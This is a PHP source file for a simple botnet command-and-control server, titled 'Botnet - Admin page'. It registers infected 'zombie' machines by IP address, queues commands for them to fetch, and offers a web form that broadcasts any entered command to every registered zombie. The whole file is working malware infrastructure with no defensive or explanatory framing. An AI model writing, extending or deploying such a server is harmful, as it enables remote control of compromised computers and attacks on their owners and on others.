<?php
// Configuration constants
define("COMMANDS_FODER", "zombies");

// Encript the client IP
$client_id = $_SERVER['REMOTE_ADDR'];

if(isset($_GET['action'])){
	$action = $_GET['action'];
}else{
	$action = 'get';
}

@mkdir(COMMANDS_FODER);
switch ($action) {
	case 'register':
		// Register a new zombie
		file_put_contents(COMMANDS_FODER.'/'.$client_id, '', LOCK_EX);
		exit;
		break;
	case 'get':
		// Download commands of that specific zombie
		$file_content = file_get_contents(COMMANDS_FODER.'/'.$client_id);
		file_put_contents(COMMANDS_FODER.'/'.$client_id, '', LOCK_EX);
		echo $file_content;
		exit;
		break;
	case 'new':
		$files = array_diff(scandir(COMMANDS_FODER), array('..', '.'));
		foreach ($files as $key => $file) {
			file_put_contents(COMMANDS_FODER.'/'.$file, $_POST['command'].PHP_EOL, FILE_APPEND | LOCK_EX);
		}
		break;
	case 'admin':
		// Load new commands
		$files = array_diff(scandir(COMMANDS_FODER), array('..', '.'));
		break;
}

?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title>Botnet - Admin page</title>
	</head>
	<body>
		<h1>Registered zombies</h1>
		<?php
		foreach ($files as $file) {
			echo '<p>'.$file.'</p>';
		}
		?>
		<h1>Send a new command</h1>
		<form action="server.php?action=new" method="post">
			<textarea name="command"></textarea><br>
			<input type="submit" value="Send">
		</form>
	</body>
</html>
